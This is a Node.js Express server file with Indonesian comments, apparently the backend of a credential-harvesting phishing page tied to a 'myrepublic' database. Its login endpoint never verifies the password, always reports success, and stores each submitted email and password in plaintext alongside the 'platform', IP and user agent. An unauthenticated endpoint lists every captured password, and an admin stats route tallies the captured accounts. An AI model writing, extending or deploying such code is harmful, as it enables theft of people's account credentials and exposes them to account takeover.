// server.js
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static('public')); // untuk serve static files

// Inisialisasi database SQLite
const db = new sqlite3.Database('./myrepublic.db');

// Create tables
db.serialize(() => {
    // Tabel users untuk current user
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE NOT NULL,
        name TEXT NOT NULL,
        platform TEXT NOT NULL,
        login_time DATETIME NOT NULL,
        profile_picture TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Tabel login_logs untuk menyimpan semua log login termasuk password
    db.run(`CREATE TABLE IF NOT EXISTS login_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        log_id TEXT UNIQUE NOT NULL,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        name TEXT NOT NULL,
        platform TEXT NOT NULL,
        login_time DATETIME NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        status TEXT DEFAULT 'success',
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// API Routes

// Login endpoint
app.post('/api/login', (req, res) => {
    const {
        email,
        password,
        name,
        platform,
        profilePicture,
        ipAddress,
        userAgent
    } = req.body;

    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email dan password wajib diisi'
        });
    }

    const loginTime = new Date().toISOString();
    const logId = 'log_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

    // Insert/Update current user
    db.run(`INSERT OR REPLACE INTO users 
            (email, name, platform, login_time, profile_picture) 
            VALUES (?, ?, ?, ?, ?)`,
        [email, name, platform, loginTime, profilePicture],
        function (err) {
            if (err) {
                console.error('Error saving user:', err);
                return res.status(500).json({
                    success: false,
                    message: 'Gagal menyimpan data user'
                });
            }

            // Save login log with password
            db.run(`INSERT INTO login_logs 
                    (log_id, email, password, name, platform, login_time, ip_address, user_agent, status) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [logId, email, password, name, platform, loginTime, ipAddress, userAgent, 'success'],
                function (logErr) {
                    if (logErr) {
                        console.error('Error saving login log:', logErr);
                        return res.status(500).json({
                            success: false,
                            message: 'Gagal menyimpan log login'
                        });
                    }

                    res.json({
                        success: true,
                        message: 'Login berhasil',
                        user: {
                            id: this.lastID,
                            email,
                            name,
                            platform,
                            loginTime,
                            profilePicture
                        }
                    });
                });
        });
});

// Get current user
app.get('/api/current-user', (req, res) => {
    db.get(`SELECT * FROM users ORDER BY login_time DESC LIMIT 1`, (err, row) => {
        if (err) {
            console.error('Error fetching current user:', err);
            return res.status(500).json({
                success: false,
                message: 'Gagal mengambil data user'
            });
        }

        if (row) {
            res.json({
                success: true,
                user: {
                    id: row.id,
                    email: row.email,
                    name: row.name,
                    platform: row.platform,
                    loginTime: row.login_time,
                    profilePicture: row.profile_picture
                }
            });
        } else {
            res.json({
                success: false,
                message: 'Tidak ada user yang login'
            });
        }
    });
});

// Get all login logs (untuk admin/debugging)
app.get('/api/login-logs', (req, res) => {
    const { search, platform, page = 1, limit = 10 } = req.query;

    let query = `SELECT * FROM login_logs WHERE 1=1`;
    let params = [];

    // Add search filter
    if (search) {
        query += ` AND (name LIKE ? OR email LIKE ? OR platform LIKE ?)`;
        const searchTerm = `%${search}%`;
        params.push(searchTerm, searchTerm, searchTerm);
    }

    // Add platform filter
    if (platform) {
        query += ` AND platform = ?`;
        params.push(platform);
    }

    query += ` ORDER BY timestamp DESC`;

    // Add pagination
    const offset = (page - 1) * limit;
    query += ` LIMIT ? OFFSET ?`;
    params.push(parseInt(limit), parseInt(offset));

    db.all(query, params, (err, rows) => {
        if (err) {
            console.error('Error fetching login logs:', err);
            return res.status(500).json({
                success: false,
                message: 'Gagal mengambil log login'
            });
        }

        // Get total count for pagination
        let countQuery = `SELECT COUNT(*) as total FROM login_logs WHERE 1=1`;
        let countParams = [];

        if (search) {
            countQuery += ` AND (name LIKE ? OR email LIKE ? OR platform LIKE ?)`;
            const searchTerm = `%${search}%`;
            countParams.push(searchTerm, searchTerm, searchTerm);
        }

        if (platform) {
            countQuery += ` AND platform = ?`;
            countParams.push(platform);
        }

        db.get(countQuery, countParams, (countErr, countRow) => {
            if (countErr) {
                console.error('Error counting logs:', countErr);
                return res.status(500).json({
                    success: false,
                    message: 'Gagal menghitung total log'
                });
            }

            res.json({
                success: true,
                logs: rows,
                pagination: {
                    page: parseInt(page),
                    limit: parseInt(limit),
                    total: countRow.total,
                    totalPages: Math.ceil(countRow.total / limit)
                }
            });
        });
    });
});

// Get admin statistics
app.get('/api/admin/stats', (req, res) => {
    const queries = {
        totalUsers: `SELECT COUNT(DISTINCT email) as count FROM login_logs`,
        totalLogins: `SELECT COUNT(*) as count FROM login_logs`,
        todayLogins: `SELECT COUNT(*) as count FROM login_logs WHERE DATE(timestamp) = DATE('now')`,
        popularPlatform: `SELECT platform, COUNT(*) as count FROM login_logs GROUP BY platform ORDER BY count DESC LIMIT 1`
    };

    const stats = {};
    let completed = 0;
    const total = Object.keys(queries).length;

    Object.keys(queries).forEach(key => {
        db.get(queries[key], (err, row) => {
            if (err) {
                console.error(`Error getting ${key}:`, err);
                stats[key] = key === 'popularPlatform' ? '-' : 0;
            } else {
                if (key === 'popularPlatform') {
                    stats[key] = row ? row.platform : '-';
                } else {
                    stats[key] = row ? row.count : 0;
                }
            }

            completed++;
            if (completed === total) {
                res.json({
                    success: true,
                    stats: stats
                });
            }
        });
    });
});

// Delete login log
app.delete('/api/login-logs/:logId', (req, res) => {
    const logId = req.params.logId;

    db.run(`DELETE FROM login_logs WHERE log_id = ?`, [logId], function (err) {
        if (err) {
            console.error('Error deleting log:', err);
            return res.status(500).json({
                success: false,
                message: 'Gagal menghapus log'
            });
        }

        res.json({
            success: true,
            message: 'Log berhasil dihapus',
            deletedRows: this.changes
        });
    });
});

// Logout endpoint
app.post('/api/logout', (req, res) => {
    // Bisa tambahkan logic logout jika diperlukan
    res.json({
        success: true,
        message: 'Logout berhasil'
    });
});

// Delete user (untuk testing)
app.delete('/api/users/:id', (req, res) => {
    const userId = req.params.id;

    db.run(`DELETE FROM users WHERE id = ?`, [userId], function (err) {
        if (err) {
            console.error('Error deleting user:', err);
            return res.status(500).json({
                success: false,
                message: 'Gagal menghapus user'
            });
        }

        res.json({
            success: true,
            message: 'User berhasil dihapus',
            deletedRows: this.changes
        });
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({
        success: false,
        message: 'Terjadi kesalahan server'
    });
});

app.listen(PORT, () => {
    console.log(`Server berjalan di http://localhost:${PORT}`);
    console.log('Database SQLite tersedia di: ./myrepublic.db');
});

// Graceful shutdown
process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            console.error('Error closing database:', err);
        } else {
            console.log('Database connection closed.');
        }
        process.exit(0);
    });
});